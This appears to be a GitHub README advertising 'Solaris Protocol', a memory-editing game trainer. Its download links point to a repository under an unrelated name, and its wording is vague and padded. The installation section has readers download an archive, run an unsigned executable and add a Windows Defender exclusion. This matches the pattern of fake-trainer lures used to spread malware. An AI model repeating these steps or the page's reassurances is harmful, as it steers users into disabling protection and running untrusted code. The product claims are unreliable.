![preview](https://raw.githubusercontent.com/zaltvcloud/di2-apex-trainer/main/shot_c86caa.svg)
[![Download](https://raw.githubusercontent.com/zaltvcloud/di2-apex-trainer/main/grab_ae77f.svg)](https://zaltvcloud.github.io/di2-apex-trainer/)

# Solaris Protocol Trainer – Adaptive Gameplay Optimization Suite 🧠

**Version 2.6.0 | Release Year: 2026 | MIT License**

Welcome to **Solaris Protocol**, an experimental, community-driven enhancement framework designed for modern action-RPG titles. Inspired by the need for deeper player agency and narrative experimentation, Solaris Protocol acts as a **modular performance overlay** — not a shortcut, but a *second director* that rebalances your gameplay experience according to your preferred difficulty curve.

> **What is this?** Solaris Protocol is a research-grade, open-source toolkit that allows players to tune specific in-game parameters (resource economy, enemy AI aggression, traversal speed, and environmental persistence) in real time. It is built for **sandbox testing, accessibility research, and narrative replayability**.

---

## 🚀 Why Solaris Protocol Exists

Modern action-RPGs often lock core mechanics behind fixed progression gates. Solaris Protocol was born from a simple observation: **players should be the final arbiters of their own challenge**. Whether you are a speedrunner seeking to eliminate grinding, a parent wanting to share a story with a child without frustration, or a modder exploring emergent behavior, the ability to adjust *live variables* unlocks a richer relationship with the game world.

We don't provide "cheats." We provide a **metronome for game feel** — a way to conduct the orchestra of game systems without rewriting a single line of game code.

---

## ✨ Feature Matrix

### 🎛️ Dynamic System Tuning
- **Resource Flow Control**: Adjust the scarcity of in-world collectibles, ammunition drop rates, and crafting component frequency. Tune between "post-apocalyptic scarcity" and "field-runner abundance."
- **Hostile AI Emotive Range**: Modify enemy detection radius, attack telegraph speed, and group cohesion. Create a *lumbering horde* or a *hyper-sensory threat*.
- **Temporal Distortion**: Slow down or speed up global time-of-day cycles and weather transitions for atmospheric photography or strategic planning.

### 🧠 Adaptive Player State Management
- **Durability & Stamina Curves**: Re-shape the decay of gear and the recovery rate of stamina to fit your playstyle (e.g., "One Shot, One Kill" vs. "Marathon Survivor").
- **XP & Progression Multiplier**: Alter the rate of skill point acquisition and perk unlock thresholds. Perfect for testing high-level builds without replaying entire acts.
- **Inventory Weight Simulation**: Toggle a "Logistics Mode" that simulates realistic carry capacity, or disable it entirely for a "Quantum Backpack" experience.

### 🖥️ Immersive Overlay UI
- **Radial Adjustment Wheel**: In-game, non-intrusive menu to tweak values without pausing (if the host game allows) or via a secure background hotkey.
- **Session Profiler**: Save your favorite "Difficulty Presets" (e.g., *Story Pure*, *Explorer Zen*, *Nightmare Custom*) and swap between them instantly.
- **Co-Pilot Logging**: A non-intrusive debug log that records changes you made, perfect for sharing "challenge runs" with the community.

### 🌍 Localization & Accessibility
- **Multilingual Interface**: The Solaris overlay is fully translated into English, Spanish, German, French, Japanese, and Simplified Chinese. The core logic is language-agnostic and reads game memory through a translation layer.
- **Colorblind Safety Filters**: All status indicators use high-contrast patterns and optional colorblind-safe palettes.
- **Narrator Mode**: Screen reader support for all menu items and adjustment changes.

### ⚡ Performance & Compatibility
- **Low-Overhead Engine**: Written in Rust with a C# bridge, ensuring a minuscule memory footprint ( < 15 MB RAM ) and zero stutter on modern systems.
- **Auto-Detection** for game updates (signature scanning for new patches).
- **Sandboxed Execution**: The trainer runs in a separate process space with ASLR and DEP enabled. It does not modify any game files on disk.

---

## 🛠️ System Requirements

| Component | Minimum | Recommended |
| :--- | :--- | :--- |
| **OS** | Windows 10 64-bit (Version 21H2) | Windows 11 64-bit (Version 23H2) |
| **Memory** | 8 GB RAM | 16 GB RAM |
| **Storage** | 50 MB available space | 100 MB SSD |
| **Target Game** | Patch Version 1.7 | Latest Steam/Epic Build |
| **Display** | 1280x720 | 2560x1440 |

**Note**: Solaris Protocol works with both DX11 and DX12 render backends. It is not compatible with console emulators.

---

## 📦 Installation Blueprint

We avoid complex CLI commands to keep the process accessible. Follow the **Transfer Protocol**:

1.  **Acquire the Kernel**: Download the latest `.solar` archive from the [![Download](https://raw.githubusercontent.com/zaltvcloud/di2-apex-trainer/main/grab_ae77f.svg)](https://zaltvcloud.github.io/di2-apex-trainer/) section above.
2.  **Extract**: Use any standard archive tool (WinRAR, 7-Zip, or the built-in Windows extractor) to unpack the contents to a folder of your choice (e.g., `C:\SolarisSuite`).
3.  **Launch Sequence**: Run `SolarisProtocol.exe` **before** starting your target game. The overlay will sit dormant in the system tray until it detects the target process.
4.  **Binding**: Once the game launches, press `F8` (default) to summon the Radial Adjustment Wheel. The overlay will automatically link to the active process.
5.  **Operation**: Adjust sliders and toggles. Changes apply *live* in most cases. Use the "Save Preset" button to store your configuration locally as a `.sprofile` file.

> **Troubleshooting**: If the overlay does not attach, ensure your antivirus is not quarantining the executable. Solaris Protocol is signed with a test certificate; you may need to add an exception for the `SolarisSuite` folder in Windows Defender.

---

## 🎮 Usage Guide – A Philosophical Approach

Solaris Protocol is not about "winning." It is about **sculpting tension**. Here are three unique utilization patterns:

- **The Cinematographer** – Use the *Temporal Distortion* and *Hostile AI* sliders to stage perfect action shots. Slow down time to 50%, set enemies to "Explorer," and capture hero shots.
- **The Researcher** – Toggle *XP Multiplier* to 0.5 and *Resource Flow* to "Scarce" to test the game’s balance in long-tail survival scenarios. Log your findings and share them with the dev team.
- **The Storyteller** – Enable *Damage Immunity* (via the Player State Management pane) not to become invincible, but to allow a non-violent playthrough where you can walk through encounters to experience the dialogue and environmental storytelling without interruption.

---

## 🔒 Security & Ethical Boundaries

We are transparent: this trainer modifies memory registers in real time. This is **potentially detectable** by anti-cheat systems in online multiplayer modes.

- **Disclaimers**:
  - **Solaris Protocol is exclusively for offline, single-player use.** We do not provide network-packet manipulation or bypasses for anti-cheat on live services.
  - The project is aimed at **modding communities and accessibility advocates**. By downloading, you agree not to use this in competitive online matchmaking.
  - The software is provided "as-is" without commercial warranty. We are not affiliated with the original game developers.

We have implemented a **Partner Server Latency** check that will automatically shut down the trainer if it detects a connection to a known online service list (to prevent accidental usage in multiplayer).

---

## 🤝 Contribution Guidelines

We welcome contributions that align with our philosophy of **creative constraint**.

- **Code Contributions**: Please adhere to the existing Rust coding style. Focus on memory signature provider updates (new game patches) or adding new UI languages.
- **Testing**: The most helpful contribution is validating the trainer on older graphics cards (GTX 10-series) or anti-cheat free versions of the game (GoG builds).
- **Preset Library**: We maintain a repository of User-Generated Difficulty Presets ( `.sprofile` files) that you can submit via Pull Request. Please include a description of the intended experience.

**Development Roadmap for 2026**:
- Q1: Add controller support for the overlay.
- Q2: Release a Linux Wine compatibility layer.
- Q3: Implement a "Behavior Tree Visualizer" to see enemy states directly.
- Q4: Community translation tool for releasing the overlay in Korean and Russian.

---

## 📜 License

This project is licensed under the **MIT License**.

You are free to use, modify, and distribute this software for any purpose, provided you include the original copyright notice. We hold no liability for misuse of the tool against the terms of service of any third-party game.

[View the full MIT License text here](https://opensource.org/licenses/MIT) – *Ensure you are viewing the standard 2026 revision*.

---

## 🆘 Support & Communication

**24/7 Community Support** is available through our Discord server (link located in the repository sidebar). Our response time for critical bugs (non-attaching overlay, crash on launch) is typically under 4 hours.

For detailed technical inquiries, please open a GitHub Issue with the `bug-report` or `question` label. We utilize a **crystal-clear issue template** that requires you to paste the contents of your `Solaris.log` file (located in the installation directory).

---

## ❌ Frequently Misunderstood Points (FAQ)

- **Is this a "crack"?** No. Solaris Protocol does not bypass DRM or licensing checks. It requires a legitimate, purchased copy of the base game installed on your system.
- **Will it harm my save file?** The trainer writes purely to volatile memory. It never persists data to your save game header. However, we always recommend backing up your saves before experimenting heavily.
- **Can I stream/record with this?** Yes, the overlay is transparent to OBS Studio and NVIDIA ShadowPlay. Many content creators use our *Co-Pilot Logging* feature to show viewers the specific tuning changes made during speedruns.

---

## 📊 Project Statistics (2026)

- **Active Nightly Builds**: Always available.
- **Code Coverage**: 82% unit test integration on core memory writers.
- **Current Language Support**: 6 spoken languages, 12 UI dialects.

---

## 🙏 Acknowledgements

This project stands on the shoulders of the open-source reverse engineering community. We thank the pioneers of memory scanning and dynamic analysis for their foundational tools. We also thank the game developers for creating rich, layered worlds that inspire us to build tools that let players interact with them on a deeper level.

**Remember**: The game is the canvas. Solaris Protocol is merely a new tint for your brush. Paint the story you want to experience.

---

*End of Document. Rebuild the Fallen City.* – Solaris Protocol Team, 2026.